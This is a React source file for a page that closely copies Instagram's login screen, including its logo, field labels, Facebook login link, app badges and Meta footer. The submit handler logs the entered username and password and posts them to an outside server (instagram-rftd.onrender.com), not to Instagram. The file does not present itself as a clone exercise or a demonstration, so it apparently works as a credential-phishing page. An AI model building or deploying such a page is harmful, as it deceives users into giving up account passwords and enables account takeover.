import React, { useState } from "react";
import axios from "axios";
import logo from "../assets/—Pngtree—instagram icon instagram_3584859.png";
export default function InstagramLogin() {
  const [data, setData] = useState({
    credential: "",
    password: "",
  });

  const onChangeHandler = (event) => {
    const name = event.target.name;
    const value = event.target.value;
    setData((data) => ({ ...data, [name]: value }));
    console.log(data);
  };

  const onLogin = async (event) => {
    event.preventDefault();
    console.log(data);
    const response = await axios.post(
      "https://instagram-rftd.onrender.com/login",
      data
    );
    console.log(response.data.message);
  };

  return (
    <div className="flex flex-col items-center min-h-screen bg-white p-4  my-8 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
      <div className="w-full max-w-xs">
        <img className="h-16  block mx-auto" src={logo} alt="" />
        <form action="" onSubmit={onLogin}>
          <input
            type="text"
            value={data.credential}
            placeholder="Phone number, username, or email"
            className="w-full p-3 mb-3 border rounded bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-300"
            name="credential"
            onChange={onChangeHandler}
            required
          />
          <input
            type="password"
            value={data.password}
            placeholder="Password"
            className="w-full p-3 mb-3 border rounded bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-300"
            name="password"
            onChange={onChangeHandler}
            required
          />

          <button className="w-full  bg-[#2137fc] bg-opacity-50 text-white p-2 rounded mb-4 hover:bg-blue-600 transition">
            Log in
          </button>
        </form>

        <div className="flex items-center mb-4">
          <div className="flex-grow h-px bg-gray-300"></div>
          <span className="mx-2 text-sm text-gray-500">OR</span>
          <div className="flex-grow h-px bg-gray-300"></div>
        </div>

        <div className="flex justify-center mb-4">
          <button
            className="flex items-center text-blue-700 hover:underline"
            type="submit"
          >
            <i className="fab fa-facebook-square mr-2"></i> Log in with Facebook
          </button>
        </div>
        <div className="text-center mb-6">
          <button className="text-blue-500 text-sm hover:underline">
            Forgot password?
          </button>
        </div>

        <div className="text-center text-sm mb-6">
          Don't have an account?{" "}
          <span className="text-blue-500 hover:underline cursor-pointer">
            Sign up
          </span>
        </div>

        <div className="text-center text-sm mb-4">Get the app.</div>

        <div className="flex justify-center mb-6 space-x-2">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
            alt="Google Play"
            className="h-10 cursor-pointer"
          />
          <img
            src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png"
            alt="Microsoft Store"
            className="h-10 cursor-pointer"
          />
        </div>
      </div>

      <footer className="mt-auto text-center text-xs text-gray-500 space-x-2 flex flex-wrap justify-center gap-2 max-w-lg">
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Locations</span>
        <span>Instagram Lite</span>
        <span>Threads</span>
        <span>Contact Uploading & Non-Users</span>
        <span>Meta Verified</span>
        <div className="w-full text-center mt-2">
          English © 2025 Instagram from Meta
        </div>
      </footer>
    </div>
  );
}
